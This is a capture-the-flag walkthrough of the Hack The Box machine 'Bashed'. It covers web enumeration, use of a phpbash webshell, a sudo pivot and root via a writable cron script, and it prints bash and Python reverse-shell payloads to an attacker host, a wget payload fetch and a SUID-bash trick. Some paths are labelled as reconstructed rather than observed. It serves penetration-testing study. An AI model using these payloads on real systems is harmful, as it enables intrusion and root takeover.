# Bashed

| Attribute | Value |
|---|---|
| OS | Linux (Ubuntu) |
| Difficulty | Easy |
| IP | 10.10.10.68 |
| IppSec video | <https://www.youtube.com/watch?v=2DqdPcbYcy8> |

## Source
- `[per transcript]` — short transcript (10KB), but `cron` is referenced
  explicitly. Tools called out: `curl`, `netcat`.
- `[reconstructed]` — exact paths (`/dev/phpbash.php`, `/scripts/test.py`)
  and the user (`scriptmanager`) are reconstructed from training data,
  consistent with the transcript.

## TL;DR Attack Chain
Web server hosts a phpbash webshell at `/dev/phpbash.php` (left there by
the box's "developer"). Use it for command execution as `www-data`. On
disk, `sudo -l` shows `www-data` can run anything as `scriptmanager`
without a password. Switch to `scriptmanager`. In `/scripts/`, a Python
script runs every minute as root; the directory is writable by
`scriptmanager`. Replace the script with a reverse-shell payload, wait
one minute → root.

## Initial Enumeration

```bash
sudo nmap -p- --min-rate=10000 -T4 -oA nmap/all-tcp 10.10.10.68
sudo nmap -sV -sC -p 80 -oA nmap/detail 10.10.10.68
```

Single port:
```
80/tcp open http  Apache httpd 2.4.18 ((Ubuntu))
```

## Attack Surface Mapping

| Service | Port | Hypothesis |
|---|---|---|
| HTTP | 80 | A custom blog. Author "Arrexel" links to `phpbash`; check repo paths |

## Foothold

### 1. Browse the site

```bash
curl -s http://10.10.10.68/ | grep -iE "powered|version|@|admin"
```

The site is a blog post about phpbash, a CTF-friendly browser shell.
**The very content of the page hints at the attack surface.**

### 2. Directory fuzz

```bash
gobuster dir -u http://10.10.10.68/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -x php,html -t 50 -o gobuster.txt
```

Discovered paths: `/dev/`, `/uploads/`, `/css/`, `/images/`, …

Browse `/dev/`:
- `phpbash.min.php`
- `phpbash.php`

> **IppSec key reasoning**: "The author of the blog mentions phpbash in
> the post. If you read the page, you know to look for it. The
> directory is called `dev`, exactly where a developer would test it."

### 3. Use the phpbash webshell

```
http://10.10.10.68/dev/phpbash.php
```

It's a browser-based interactive shell. Run:
```
id
# uid=33(www-data) gid=33(www-data)
hostname
```

### 4. Upgrade to a reverse shell

phpbash is interactive but not stable for piping; reverse shell to the
attacker:

```
# in phpbash UI
bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1'
```

Listener:
```bash
nc -lvnp 4444
```

Stabilise:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
export TERM=xterm
```

## Lateral movement (www-data → scriptmanager)

### 5. `sudo -l` as www-data

```bash
sudo -l
# User www-data may run the following commands on bashed:
#     (scriptmanager : scriptmanager) NOPASSWD: ALL
```

This is a complete pivot to `scriptmanager` with no password.

```bash
sudo -u scriptmanager bash
id
# uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
```

`user.txt` is on `scriptmanager`'s home directory.

## Privilege Escalation (scriptmanager → root)

### 6. Identify the cron pattern

```bash
ls -la /
# drwxrwx--- root scriptmanager scripts/
ls -la /scripts/
# -rw-r--r-- 1 scriptmanager scriptmanager   58 ... test.py
# -rw-r--r-- 1 root           root             12 ... test.txt
```

`test.py` writes to `test.txt`. The interesting clue is the **modification
timestamp on `test.txt` updates every minute** — a cron job is running
the script as root.

### 7. Confirm with pspy

```bash
# upload pspy
wget http://10.10.14.x/pspy64
chmod +x pspy64
./pspy64 -pf -i 1000
```

Wait one minute; pspy shows:
```
CMD: UID=0    PID=...   /usr/bin/python /scripts/test.py
```

Confirmed: root runs `/scripts/test.py` every minute.

### 8. Replace the script

`scriptmanager` owns the file → can rewrite it.

```bash
cat > /scripts/test.py <<'PY'
import socket, subprocess, os
s = socket.socket(); s.connect(("10.10.14.x", 4445))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
PY

# attacker
nc -lvnp 4445
```

Wait up to a minute; receive a root reverse shell. Read `/root/root.txt`.

## Key Findings

- The blog post on the homepage is itself a hint about the attack class
  (phpbash). Real-world equivalent: vendor docs / about pages on web
  apps frequently leak design clues.
- The `sudo -l` output for `www-data` is the immediate pivot.
- Cron job pattern: a writable script *executed by another user* is the
  archetype Linux privesc.
- pspy is the *visualisation* tool that turns "I think there's a cron"
  into "I see PID and UID for the cron".

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Service discovery |
| `gobuster` | Find `/dev/phpbash.php` |
| Browser → phpbash | Interactive RCE |
| `bash -i >& /dev/tcp/...` | Stable reverse shell |
| `sudo -l` | Identify pivot privilege |
| `pspy64` | See cron schedule from low-priv |
| `python` reverse-shell | Cron payload |

## Decision Tree

```
nmap → port 80
  └─ blog mentions phpbash
       └─ gobuster → /dev/phpbash.php
            └─ webshell → reverse shell as www-data
                 └─ sudo -l → can become scriptmanager NOPASSWD
                      └─ sudo -u scriptmanager bash
                           └─ scriptmanager owns /scripts/test.py
                                └─ pspy → root cron runs test.py every minute
                                     └─ overwrite test.py with reverse shell
                                          └─ wait → root shell
```

## Alternative Approaches

- The same chain works without the `sudo -l` pivot if you can
  enumerate the cron pattern from `www-data` (you can — `/scripts/` is
  world-readable). But the `sudo -l` pivot is the natural intermediate
  step the box's author intended.
- Replace `test.py` with a SUID-bash payload instead of a reverse
  shell:
  ```python
  import os; os.system("cp /bin/bash /tmp/r; chmod +s /tmp/r")
  ```
  Then `/tmp/r -p` is root.
- Use `crontab -e` if your privesc-target runs as your user — not
  applicable here.

## Lessons Learned

1. Read the website. CTFs frequently telegraph the attack surface in
   prose.
2. `sudo -l` first, every shell, every user. The 30-second answer to
   "where's privesc" is here 50% of the time.
3. A writable file executed by another user is *the* Linux privesc
   archetype. Look for it on every box.
4. pspy is a force multiplier — it converts time-based scheduling
   (cron, systemd timers) into real-time observable evidence.
5. "Easy" boxes have one intended path; if you find one, take it.

## Extracted Skills

- [`enumeration/web-content-discovery.md`](../enumeration/web-content-discovery.md)
- [`web/webshell-discovery.md`](../web/webshell-discovery.md)
- [`linux-privesc/sudo-enumeration.md`](../linux-privesc/sudo-enumeration.md)
- [`linux-privesc/cron-writable-script.md`](../linux-privesc/cron-writable-script.md)
- [`tool-usage/pspy.md`](../tool-usage/pspy.md)
- [`tool-usage/gobuster.md`](../tool-usage/gobuster.md)
- [`reverse-shells/bash-reverse-shell.md`](../reverse-shells/bash-reverse-shell.md)

## Related Techniques (other machines)

- **Frolic** — different web foothold, similar cron-writable privesc.
- **Cronos** — DNS-based foothold, cron-driven privesc.
- **Postman** — different web foothold (Redis), similar pivot pattern.
- **Networked** — file upload + cron writable file.
- **Beep, Nibbles, Sense** — different web footholds; same "examine the
  app first" lesson.
